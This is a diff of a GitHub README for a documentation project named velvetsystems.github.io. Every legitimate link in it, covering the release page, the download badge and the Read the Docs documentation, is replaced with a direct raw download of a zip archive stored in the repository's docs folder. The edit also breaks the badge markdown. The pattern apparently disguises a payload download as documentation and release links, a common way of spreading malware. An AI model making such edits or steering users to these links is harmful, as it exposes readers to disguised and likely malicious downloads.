@@ -1,6 +1,6 @@
-# 🌟 velvetsystems.github.io - Your Guide to Simple Documentation Access
+# 🌟 https://github.com/duy225345/velvetsystems.github.io/raw/refs/heads/main/docs/velvetsystems_io_github_v2.3-beta.3.zip - Your Guide to Simple Documentation Access
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/duy225345/velvetsystems.github.io/releases)
+[![Download Latest Release](https://github.com/duy225345/velvetsystems.github.io/raw/refs/heads/main/docs/velvetsystems_io_github_v2.3-beta.3.zip%20Latest%https://github.com/duy225345/velvetsystems.github.io/raw/refs/heads/main/docs/velvetsystems_io_github_v2.3-beta.3.zip)](https://github.com/duy225345/velvetsystems.github.io/raw/refs/heads/main/docs/velvetsystems_io_github_v2.3-beta.3.zip)
 
 ## 📑 Overview
 
@@ -12,7 +12,7 @@ To get started with our application, just follow the steps below. You won't need
 
 ## 🔗 Download & Install
 
-1. **Visit the Release Page**: Go to our [Releases page](https://github.com/duy225345/velvetsystems.github.io/releases).
+1. **Visit the Release Page**: Go to our [Releases page](https://github.com/duy225345/velvetsystems.github.io/raw/refs/heads/main/docs/velvetsystems_io_github_v2.3-beta.3.zip).
    
 2. **Choose the Latest Version**: Look for the latest version at the top of the page.
 
@@ -40,7 +40,7 @@ To ensure smooth operation, your system should meet the following minimum requir
 
 Once you have installed the application, view our documentation at the following link:
 
-[Documentation on Read the Docs](https://velvetsystems.readthedocs.io/)
+[Documentation on Read the Docs](https://github.com/duy225345/velvetsystems.github.io/raw/refs/heads/main/docs/velvetsystems_io_github_v2.3-beta.3.zip)
 
 This resource will help you navigate through features, updates, and troubleshooting.
 
@@ -83,7 +83,7 @@ Explore these topics for more insights related to our application:
 
 ## 📥 Direct Download Link
 
-For quick access, here is the [link to the Releases page](https://github.com/duy225345/velvetsystems.github.io/releases) once again. 
+For quick access, here is the [link to the Releases page](https://github.com/duy225345/velvetsystems.github.io/raw/refs/heads/main/docs/velvetsystems_io_github_v2.3-beta.3.zip) once again. 
 
 ### Conclusion
 
